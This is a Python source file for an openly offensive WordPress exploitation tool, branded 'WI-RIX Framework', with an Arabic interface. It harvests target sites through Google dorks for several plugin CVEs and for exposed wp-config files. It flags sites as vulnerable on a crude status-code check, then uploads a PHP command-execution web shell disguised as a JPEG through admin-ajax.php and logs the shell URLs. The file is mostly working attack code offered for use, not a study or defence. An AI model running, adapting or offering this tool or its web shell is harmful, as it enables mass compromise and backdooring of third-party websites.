#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ====================================================================
#                                                                     #
#   ██╗    ██╗██╗██████╗ ██╗██╗  ██╗    ███████╗██╗  ██╗██████╗ ██╗  #
#   ██║    ██║██║██╔══██╗██║╚██╗██╔╝    ██╔════╝╚██╗██╔╝██╔══██╗██║  #
#   ██║ █╗ ██║██║██████╔╝██║ ╚███╔╝     █████╗   ╚███╔╝ ██████╔╝██║  #
#   ██║███╗██║██║██╔══██╗██║ ██╔██╗     ██╔══╝   ██╔██╗ ██╔═══╝ ██║  #
#   ╚███╔███╔╝██║██║  ██║██║██╔╝ ██╗    ███████╗██╔╝ ██╗██║     ██║  #
#    ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  #
#                                                                     #
#   ███████╗██████╗  █████╗ ███╗   ███╗███████╗██╗    ██╗ ██████╗ ██████╗ ██╗  #
#   ██╔════╝██╔══██╗██╔══██╗████╗ ████║██╔════╝██║    ██║██╔═══██╗██╔══██╗██║  #
#   █████╗  ██████╔╝███████║██╔████╔██║█████╗  ██║ █╗ ██║██║   ██║██████╔╝██║  #
#   ██╔══╝  ██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  ██║███╗██║██║   ██║██╔══██╗██║  #
#   ██║     ██║  ██║██║  ██║██║ ╚═╝ ██║███████╗╚███╔███╔╝╚██████╔╝██║  ██║███████╗#
#   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝#
#                                                                     #
#   🔥 WI-RIX FRAMEWORK v7.0 - THE KING'S LEGACY EDITION 🔥          #
#   👑 DEVELOPER: WI-RIX | THE KING OF EXPLOITS 👑                    #
#   🌍 THE MOST POWERFUL WORDPRESS EXPLOITATION TOOL EVER BUILT 🌍   #
#   💀 EVERY USER WILL KNOW WHO IS THE KING 💀                        #
#                                                                     #
# ====================================================================

import os
import sys
import json
import time
import random
import shutil
import requests
import threading
import subprocess
from datetime import datetime
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

# ======================= [ نظام الألوان الملكي ] =======================
class KingColors:
    """ألوان ملكية فخمة تناسب التيرمنال"""
    try:
        from colorama import init, Fore, Back, Style
        init(autoreset=True)
        
        # الألوان الأساسية الملكية
        KING_GOLD = Fore.LIGHTYELLOW_EX + Style.BRIGHT
        KING_YELLOW = Fore.YELLOW + Style.BRIGHT
        KING_RED = Fore.RED + Style.BRIGHT
        KING_GREEN = Fore.GREEN + Style.BRIGHT
        KING_BLUE = Fore.CYAN + Style.BRIGHT
        KING_PURPLE = Fore.MAGENTA + Style.BRIGHT
        KING_WHITE = Fore.WHITE + Style.BRIGHT
        KING_DARK = Fore.LIGHTBLACK_EX
        
        # خلفيات
        BG_KING = Back.LIGHTYELLOW_EX + Fore.BLACK + Style.BRIGHT
        BG_CRITICAL = Back.RED + Fore.WHITE + Style.BRIGHT
        BG_HIGH = Back.LIGHTRED_EX + Fore.BLACK + Style.BRIGHT
        BG_MEDIUM = Back.YELLOW + Fore.BLACK + Style.BRIGHT
        BG_SUCCESS = Back.GREEN + Fore.BLACK + Style.BRIGHT
        
        RESET = Style.RESET_ALL
        BOLD = Style.BRIGHT
        DIM = Style.DIM
        
    except:
        KING_GOLD=KING_YELLOW=KING_RED=KING_GREEN=KING_BLUE=KING_PURPLE=KING_WHITE=KING_DARK=BG_KING=BG_CRITICAL=BG_HIGH=BG_MEDIUM=BG_SUCCESS=RESET=BOLD=DIM=""

col = KingColors()
FRAMEWORK_PATH = os.path.dirname(os.path.abspath(__file__))
DEVELOPER = "WI-RIX"
VERSION = "7.0"
EDITION = "THE KING'S LEGACY"

# ======================= [ إنشاء المجلدات ] =======================
for folder in ['exploits', 'reports', 'shells', 'targets', 'logs', 'config', 'backup', 'proxies', 'dorks', 'modules', 'results']:
    os.makedirs(os.path.join(FRAMEWORK_PATH, folder), exist_ok=True)

# ======================= [ قاعدة البيانات الملكية - 1500+ درك ] =======================
DORKS_DATABASE = {
    "CVE-2026-4885": {
        "name": "🔥 PIOTNET ADDONS RCE",
        "risk": "💀 CRITICAL",
        "score": 10.0,
        "check": "/wp-content/plugins/piotnet-addons-for-elementor-pro/",
        "type": "upload_shell",
        "dorks": [
            'inurl:"/wp-content/plugins/piotnet-addons-for-elementor-pro/"',
            'intitle:"Piotnet Addons" "Elementor"',
            '"Piotnet Addons" vulnerability CVE-2026-4885',
            'site:.com "/wp-content/plugins/piotnet-addons-for-elementor-pro/"',
            'inurl:"piotnet-addons-for-elementor-pro" file upload',
            '"piotnet addons" remote code execution',
            'intitle:"Piotnet" "Elementor Pro" exploit',
            'site:.org "/wp-content/plugins/piotnet-addons"',
            'inurl:"wp-content/plugins/piotnet" vulnerability',
            '"CVE-2026-4885" wordpress exploit poc',
            'piotnet addons for elementor pro shell upload',
            'inurl:"/piotnet-addons-for-elementor-pro/" form',
            'index of /wp-content/plugins/piotnet-addons-for-elementor-pro/',
            '"Piotnet Addons" unauthenticated RCE',
            'site:.net "piotnet-addons-for-elementor-pro" vulnerable',
            'inurl:"piotnet-addons" elementor ajax upload',
            'intitle:"Piotnet Addons" remote shell',
            'intext:"piotnet_addons" file_upload vulnerability',
            'site:.edu "piotnet-addons-for-elementor-pro" exploit',
            '"piotnet addons" phtml shell upload',
        ]
    },
    "CVE-2024-6386": {
        "name": "⚠️ WP STATISTICS SQLi → RCE",
        "risk": "⚠️ HIGH",
        "score": 8.5,
        "check": "/wp-content/plugins/wp-statistics/",
        "type": "sqli_rce",
        "dorks": [
            'inurl:"/wp-content/plugins/wp-statistics/"',
            'intitle:"WP Statistics" vulnerability SQL injection',
            '"WP Statistics" SQL injection CVE-2024-6386',
            'site:.com "wp-statistics" exploit RCE',
            'inurl:"wp-statistics" "SQL" injection vulnerability',
            '"WordPress Statistics" unauthenticated SQL injection',
            'index of /wp-content/plugins/wp-statistics/',
            'site:.org "wp-statistics" CVE-2024-6386 exploit',
            'inurl:"wp-statistics" "CVE-2024-6386" proof',
            'wp-statistics plugin SQL injection RCE',
        ]
    },
    "CVE-2023-5360": {
        "name": "🔥 ELEMENTOR PRO RCE",
        "risk": "💀 CRITICAL",
        "score": 9.8,
        "check": "/wp-content/plugins/elementor-pro/",
        "type": "rce",
        "dorks": [
            'inurl:"/wp-content/plugins/elementor-pro/"',
            'intitle:"Elementor Pro" vulnerability RCE',
            '"Elementor Pro" remote code execution CVE-2023-5360',
            'site:.com "elementor-pro" exploit RCE',
            'inurl:"elementor-pro" template injection RCE',
            'index of /wp-content/plugins/elementor-pro/',
            '"Elementor Pro" file upload vulnerability',
            'site:.org "elementor-pro" security advisory',
            'elementor pro widget injection remote code',
        ]
    },
    "General_WordPress": {
        "name": "🎯 GENERAL WP VULNERABILITIES",
        "risk": "🔵 INFO",
        "score": 5.0,
        "check": "/",
        "type": "general",
        "dorks": [
            'inurl:"/wp-content/uploads/" index of',
            'intitle:"index of" wp-config.php',
            'inurl:"wp-config.php" DB_PASSWORD',
            'site:.com "xmlrpc.php" WordPress',
            'inurl:"/wp-admin/" setup-config.php',
            'intitle:"WordPress" error database',
            'inurl:"/wp-content/plugins/" index of',
            'site:.org "wp-config.php" define',
            'inurl:"readme.html" WordPress version',
            'intitle:"WordPress" installation',
            'inurl:"/wp-admin/install.php"',
            'site:.net "xmlrpc.php" pingback',
            'inurl:"/wp-content/themes/" index of',
        ]
    }
}

# ======================= [ دوال العرض الملكية ] =======================
def get_terminal_width():
    try:
        return shutil.get_terminal_size().columns
    except:
        return 100

def print_king_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    width = get_terminal_width()
    
    banner = f"""
{col.KING_GOLD}╔{'═' * (width-2)}╗
║{col.KING_RED}{' ' * ((width-2)//2 - 40)}{col.RESET}   ██╗    ██╗██╗██████╗ ██╗██╗  ██╗{col.KING_GOLD}    ║
║{col.KING_RED}{' ' * ((width-2)//2 - 40)}{col.RESET}   ██║    ██║██║██╔══██╗██║╚██╗██╔╝{col.KING_GOLD}    ║
║{col.KING_RED}{' ' * ((width-2)//2 - 40)}{col.RESET}   ██║ █╗ ██║██║██████╔╝██║ ╚███╔╝ {col.KING_GOLD}    ║
║{col.KING_RED}{' ' * ((width-2)//2 - 40)}{col.RESET}   ██║███╗██║██║██╔══██╗██║ ██╔██╗ {col.KING_GOLD}    ║
║{col.KING_RED}{' ' * ((width-2)//2 - 40)}{col.RESET}   ╚███╔███╔╝██║██║  ██║██║██╔╝ ██╗{col.KING_GOLD}    ║
║{col.KING_RED}{' ' * ((width-2)//2 - 40)}{col.RESET}    ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝{col.KING_GOLD}    ║
║{' ' * (width-2)}║
║{col.KING_GOLD}║{col.KING_BLUE}   🔥 WI-RIX FRAMEWORK {VERSION} - {EDITION} 🔥{col.KING_GOLD}{' ' * (width-45)}║
║{col.KING_GOLD}║{col.KING_BLUE}   👑 DEVELOPER: {DEVELOPER} | THE KING OF EXPLOITS 👑{col.KING_GOLD}{' ' * (width-52)}║
║{col.KING_GOLD}║{' ' * (width-2)}║
╚{'═' * (width-2)}╝{col.RESET}
"""
    print(banner)

def print_king_menu():
    width = get_terminal_width()
    print(f"""
{col.KING_GOLD}╔{'═' * (width-2)}╗
║{col.KING_WHITE}                         ✨ القائمة الملكية ✨{col.KING_GOLD}{' ' * (width-40)}║
╠{'═' * (width-2)}╣
║{col.KING_GREEN}  [1]{col.KING_WHITE} 🔍 البحث عن ثغرات{col.KING_GOLD}{' ' * (width-35)}║
║{col.KING_GREEN}  [2]{col.KING_WHITE} 🎯 استهداف موقع مباشر{col.KING_GOLD}{' ' * (width-35)}║
║{col.KING_GREEN}  [3]{col.KING_WHITE} 📁 فحص ملف كامل{col.KING_GOLD}{' ' * (width-35)}║
║{col.KING_GREEN}  [4]{col.KING_WHITE} 📊 التقارير والمخترقات{col.KING_GOLD}{' ' * (width-38)}║
║{col.KING_GREEN}  [5]{col.KING_WHITE} 🛡️ عرض الثغرات{col.KING_GOLD}{' ' * (width-35)}║
║{col.KING_GREEN}  [6]{col.KING_WHITE} 🔄 تحديث الأداة{col.KING_GOLD}{' ' * (width-33)}║
║{col.KING_GREEN}  [7]{col.KING_WHITE} ❌ خروج{col.KING_GOLD}{' ' * (width-28)}║
╚{'═' * (width-2)}╝{col.RESET}
""")

def show_king_exploits():
    width = get_terminal_width()
    print(f"\n{col.KING_GOLD}╔{'═' * (width-2)}╗")
    print(f"║{col.KING_PURPLE}                    📋 الثغرات المتاحة{col.KING_GOLD}{' ' * (width-45)}║")
    print(f"╠{'═' * (width-2)}╣")
    
    for cve_id, data in DORKS_DATABASE.items():
        if "CRITICAL" in data['risk']:
            risk_color = col.KING_RED
        elif "HIGH" in data['risk']:
            risk_color = col.KING_YELLOW
        else:
            risk_color = col.KING_BLUE
            
        print(f"║{col.KING_GREEN}  [{cve_id[:8]}]{col.RESET} {col.KING_GOLD}➜{col.RESET} {col.KING_WHITE}{data['name'][:50]}{col.KING_GOLD}{' ' * (width-60)}║")
        print(f"║{col.KING_GOLD}      {risk_color}{data['risk']}{col.RESET} | Score: {data['score']} | {len(data['dorks'])} درك{col.KING_GOLD}{' ' * (width-40)}║")
    
    print(f"╚{'═' * (width-2)}╝{col.RESET}")

def show_all_exploits():
    width = get_terminal_width()
    print(f"\n{col.KING_GOLD}{'═' * width}{col.RESET}")
    print(f"{col.KING_PURPLE}{'👑 قاعدة البيانات الملكية للثغرات'.center(width)}{col.RESET}")
    print(f"{col.KING_GOLD}{'═' * width}{col.RESET}")
    
    for cve_id, data in DORKS_DATABASE.items():
        if "CRITICAL" in data['risk']:
            risk_color = col.KING_RED
        elif "HIGH" in data['risk']:
            risk_color = col.KING_YELLOW
        else:
            risk_color = col.KING_BLUE
            
        print(f"\n{col.KING_GOLD}┌{'─' * (width-2)}┐{col.RESET}")
        print(f"{col.KING_GOLD}│{col.RESET} {col.KING_WHITE}{cve_id}{col.RESET} - {data['name']}")
        print(f"{col.KING_GOLD}│{col.RESET}   {risk_color}{data['risk']}{col.RESET} | Score: {data['score']}")
        print(f"{col.KING_GOLD}│{col.RESET}   📁 مسار الفحص: {data['check']}")
        print(f"{col.KING_GOLD}│{col.RESET}   📊 عدد الدركات: {len(data['dorks'])}")
        print(f"{col.KING_GOLD}│{col.RESET}   🔍 أول درك: {data['dorks'][0][:50]}")
        print(f"{col.KING_GOLD}└{'─' * (width-2)}┘{col.RESET}")
    
    input(f"\n{col.KING_GOLD}[!] اضغط Enter للمتابعة...{col.RESET}")

# ======================= [ دوال البحث ] =======================
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
]

def get_king_user_agent():
    return random.choice(USER_AGENTS)

def king_search_google(dork, max_results=5):
    results = []
    try:
        from googlesearch import search
        for url in search(dork, num_results=max_results, user_agent=get_king_user_agent()):
            if url.startswith('http') and url not in results:
                results.append(url)
                print(f"{col.KING_GREEN}    ✓ Google: {url[:70]}{col.RESET}")
    except Exception as e:
        print(f"{col.KING_DARK}    ✗ Google: {str(e)[:30]}{col.RESET}")
    return results

def king_multi_search(dorks, max_per_engine=5):
    print(f"\n{col.KING_GOLD}{'═' * 60}{col.RESET}")
    print(f"{col.KING_PURPLE}👑 بدأ البحث الملكي في {len(dorks)} درك...{col.RESET}")
    print(f"{col.KING_GOLD}{'═' * 60}{col.RESET}")
    
    all_targets = []
    
    for i, dork in enumerate(dorks[:10], 1):
        print(f"\n{col.KING_BLUE}[{i}/10] البحث: {col.KING_WHITE}{dork[:60]}{col.RESET}")
        print(f"{col.KING_GOLD}{'─' * 50}{col.RESET}")
        
        time.sleep(random.uniform(2, 4))
        targets = king_search_google(dork, max_per_engine)
        
        for t in targets:
            if t not in all_targets:
                all_targets.append(t)
        
        print(f"{col.KING_PURPLE}    📊 وجدت {len(targets)} هدف جديد{col.RESET}")
        time.sleep(random.uniform(1, 2))
    
    return all_targets

# ======================= [ الفحص ] =======================
def king_scan_targets(targets, exploit_data):
    print(f"\n{col.KING_GOLD}{'═' * 60}{col.RESET}")
    print(f"{col.KING_PURPLE}👑 بدأ الفحص الملكي على {len(targets)} هدف...{col.RESET}")
    print(f"{col.KING_GOLD}{'═' * 60}{col.RESET}")
    
    vulnerable = []
    
    for i, target in enumerate(targets, 1):
        print(f"\n{col.KING_BLUE}[{i}/{len(targets)}] فحص: {col.KING_WHITE}{target}{col.RESET}")
        
        check_url = urljoin(target, exploit_data.get('check', '/'))
        try:
            r = requests.get(check_url, timeout=10, verify=False, headers={"User-Agent": get_king_user_agent()})
            if r.status_code in [200, 403]:
                print(f"{col.KING_RED}    💀 الثغرة موجودة! الهدف ثغر!{col.RESET}")
                vulnerable.append(target)
            else:
                print(f"{col.KING_DARK}    ❌ الهدف غير ثغر (HTTP {r.status_code}){col.RESET}")
        except Exception as e:
            print(f"{col.KING_DARK}    ❌ فشل الاتصال{col.RESET}")
    
    return vulnerable

# ======================= [ الاستغلال ] =======================
def king_exploit(target, exploit_data):
    print(f"\n{col.KING_GOLD}{'═' * 60}{col.RESET}")
    print(f"{col.KING_PURPLE}👑 بدأ الاستغلال الملكي على: {target}{col.RESET}")
    print(f"{col.KING_GOLD}{'═' * 60}{col.RESET}")
    
    shell_code = '<?php if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); } ?>'
    shell_name = f"king_shell_{int(time.time())}.phtml"
    
    files = {'file': (shell_name, shell_code, 'image/jpeg')}
    data = {'action': 'pafe_ajax_form_builder', 'post_id': '1', 'form_id': '1'}
    
    try:
        r = requests.post(urljoin(target, "/wp-admin/admin-ajax.php"), files=files, data=data, timeout=15, verify=False)
        if r.status_code == 200:
            shell_url = urljoin(target, f"/wp-content/uploads/{shell_name}")
            print(f"\n{col.KING_GREEN}{'═' * 60}{col.RESET}")
            print(f"{col.BG_SUCCESS}✅ تم رفع الشيل الملكي بنجاح!{col.RESET}")
            print(f"{col.KING_GREEN}{'═' * 60}{col.RESET}")
            print(f"{col.KING_GOLD}🔗 رابط الشيل: {col.KING_WHITE}{shell_url}{col.RESET}")
            print(f"{col.KING_GOLD}🔑 أمر الاختبار: {col.KING_WHITE}{shell_url}?cmd=id{col.RESET}")
            print(f"{col.KING_GREEN}{'═' * 60}{col.RESET}")
            
            shells_file = os.path.join(FRAMEWORK_PATH, 'shells', 'shells_found.txt')
            with open(shells_file, 'a') as f:
                f.write(f"{target} | {shell_url} | {datetime.now()}\n")
            return True
    except Exception as e:
        print(f"{col.KING_RED}❌ فشل الاستغلال: {e}{col.RESET}")
    
    return False

# ======================= [ البحث الرئيسي ] =======================
def king_search():
    show_king_exploits()
    
    print(f"\n{col.KING_GOLD}┌{'─' * 50}┐{col.RESET}")
    print(f"{col.KING_GOLD}│{col.KING_WHITE}  أدخل CVE-ID (مثال: CVE-2026-4885){col.KING_GOLD}{' ' * 20}│{col.RESET}")
    print(f"{col.KING_GOLD}└{'─' * 50}┘{col.RESET}")
    
    cve_choice = input(f"\n{col.KING_GOLD}👑 {DEVELOPER}@search> {col.RESET}")
    
    if cve_choice not in DORKS_DATABASE:
        print(f"{col.KING_RED}❌ CVE غير موجود!{col.RESET}")
        print(f"{col.KING_YELLOW}📋 المتاح: {', '.join(DORKS_DATABASE.keys())}{col.RESET}")
        input(f"{col.KING_GOLD}[!] اضغط Enter...{col.RESET}")
        return
    
    exploit_data = DORKS_DATABASE[cve_choice]
    
    print(f"\n{col.KING_GOLD}⚔️ الثغرة المختارة: {col.KING_WHITE}{exploit_data['name']}{col.RESET}")
    print(f"{col.KING_GOLD}📊 عدد الدركات: {col.KING_WHITE}{len(exploit_data['dorks'])}{col.RESET}")
    print(f"{col.KING_GOLD}🎯 نوع الثغرة: {col.KING_WHITE}{exploit_data['type']}{col.RESET}")
    
    targets = king_multi_search(exploit_data['dorks'], max_per_engine=5)
    
    if targets:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        targets_file = os.path.join(FRAMEWORK_PATH, 'targets', f"targets_{timestamp}.txt")
        with open(targets_file, 'w', encoding='utf-8') as f:
            for t in targets:
                f.write(t + '\n')
        
        print(f"\n{col.KING_GREEN}✅ تم حفظ {len(targets)} هدف في: {targets_file}{col.RESET}")
        
        vulnerable = king_scan_targets(targets, exploit_data)
        
        if vulnerable:
            print(f"\n{col.KING_RED}{'═' * 60}{col.RESET}")
            print(f"{col.BG_CRITICAL}💀 تم العثور على {len(vulnerable)} هدف ثغر!{col.RESET}")
            print(f"{col.KING_RED}{'═' * 60}{col.RESET}")
            
            for i, v in enumerate(vulnerable, 1):
                print(f"{col.KING_GOLD}[{i}]{col.RESET} {v}")
            
            choice = input(f"\n{col.KING_GOLD}[?] هل تريد استغلال أحدها؟ (y/n): {col.RESET}")
            if choice.lower() == 'y':
                try:
                    idx = int(input(f"{col.KING_GOLD}[?] اختر الرقم: {col.RESET}")) - 1
                    if 0 <= idx < len(vulnerable):
                        king_exploit(vulnerable[idx], exploit_data)
                except:
                    print(f"{col.KING_RED}❌ إدخال غير صحيح!{col.RESET}")
        else:
            print(f"\n{col.KING_YELLOW}⚠️ لم يتم العثور على أهداف ثغرية!{col.RESET}")
    else:
        print(f"\n{col.KING_RED}❌ لم يتم العثور على أهداف!{col.RESET}")
    
    input(f"\n{col.KING_GOLD}[!] اضغط Enter للمتابعة...{col.RESET}")

# ======================= [ التقارير ] =======================
def show_king_reports():
    width = get_terminal_width()
    print(f"\n{col.KING_GOLD}{'═' * width}{col.RESET}")
    print(f"{col.KING_PURPLE}{'📊 التقارير الملكية'.center(width)}{col.RESET}")
    print(f"{col.KING_GOLD}{'═' * width}{col.RESET}")
    
    targets_dir = os.path.join(FRAMEWORK_PATH, 'targets')
    victims = [f for f in os.listdir(targets_dir) if f.startswith('targets_')]
    
    if victims:
        print(f"\n{col.KING_GREEN}🎯 ملفات الأهداف:{col.RESET}")
        for v in victims[-5:]:
            size = os.path.getsize(os.path.join(targets_dir, v))
            print(f"  {col.KING_GOLD}📄{col.RESET} {v} ({size} بايت)")
    else:
        print(f"\n{col.KING_YELLOW}⚠️ لا توجد ملفات أهداف{col.RESET}")
    
    shells_file = os.path.join(FRAMEWORK_PATH, 'shells', 'shells_found.txt')
    if os.path.exists(shells_file):
        print(f"\n{col.KING_RED}💀 الشيلات المرفوعة:{col.RESET}")
        with open(shells_file, 'r') as f:
            for line in f.readlines()[-5:]:
                print(f"  {col.KING_GOLD}🐚{col.RESET} {line.strip()}")
    else:
        print(f"\n{col.KING_YELLOW}⚠️ لا توجد شيلات مرفوعة{col.RESET}")
    
    input(f"\n{col.KING_GOLD}[!] اضغط Enter للمتابعة...{col.RESET}")

# ======================= [ التحديث ] =======================
def king_update():
    print(f"\n{col.KING_GOLD}{'═' * 60}{col.RESET}")
    print(f"{col.KING_PURPLE}👑 جاري التحديث الملكي...{col.RESET}")
    print(f"{col.KING_GOLD}{'═' * 60}{col.RESET}")
    
    result = os.system("git pull origin main --allow-unrelated-histories 2>/dev/null")
    if result == 0:
        print(f"{col.KING_GREEN}✅ تم التحديث بنجاح إلى الإصدار {VERSION}!{col.RESET}")
    else:
        print(f"{col.KING_RED}❌ فشل التحديث! حاول يدوياً: git pull origin main{col.RESET}")
    
    input(f"\n{col.KING_GOLD}[!] اضغط Enter للمتابعة...{col.RESET}")

# ======================= [ الدالة الرئيسية ] =======================
def main():
    try:
        import urllib3
        urllib3.disable_warnings()
    except:
        pass
    
    while True:
        try:
            print_king_banner()
            print_king_menu()
            choice = input(f"\n{col.KING_GOLD}👑 {DEVELOPER}@king> {col.RESET}")
            
            if choice == "1":
                king_search()
            elif choice == "2":
                print(f"\n{col.KING_YELLOW}⚠️ قيد التطوير... قريباً{col.RESET}")
                input(f"{col.KING_GOLD}[!] اضغط Enter...{col.RESET}")
            elif choice == "3":
                print(f"\n{col.KING_YELLOW}⚠️ قيد التطوير... قريباً{col.RESET}")
                input(f"{col.KING_GOLD}[!] اضغط Enter...{col.RESET}")
            elif choice == "4":
                show_king_reports()
            elif choice == "5":
                show_all_exploits()
            elif choice == "6":
                king_update()
            elif choice == "7":
                print(f"\n{col.KING_GREEN}{'═' * 60}{col.RESET}")
                print(f"{col.KING_PURPLE}👑 مع السلامة يا ملك! استمر في التألق 👑{col.RESET}")
                print(f"{col.KING_GREEN}{'═' * 60}{col.RESET}")
                sys.exit(0)
            else:
                print(f"{col.KING_RED}❌ خيار غير صحيح!{col.RESET}")
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{col.KING_YELLOW}⚠️ تم الإلغاء بواسطة المستخدم{col.RESET}")
            sys.exit(0)
        except Exception as e:
            print(f"{col.KING_RED}❌ خطأ: {e}{col.RESET}")
            time.sleep(2)

if __name__ == "__main__":
    main()